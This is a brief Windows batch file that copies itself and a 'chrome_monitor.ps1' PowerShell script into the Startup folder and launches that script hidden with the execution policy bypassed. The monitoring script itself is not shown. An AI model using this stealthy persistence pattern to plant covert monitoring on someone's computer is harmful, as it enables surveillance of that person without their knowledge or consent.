@echo off
set SCRIPT_PATH=%~dp0chrome_monitor.ps1

:: Add to startup
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%~f0" "%STARTUP_FOLDER%\chrome_monitor.bat" >nul
copy "%SCRIPT_PATH%" "%STARTUP_FOLDER%\chrome_monitor.ps1" >nul

:: Run PowerShell script in background
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT_PATH%"

exit
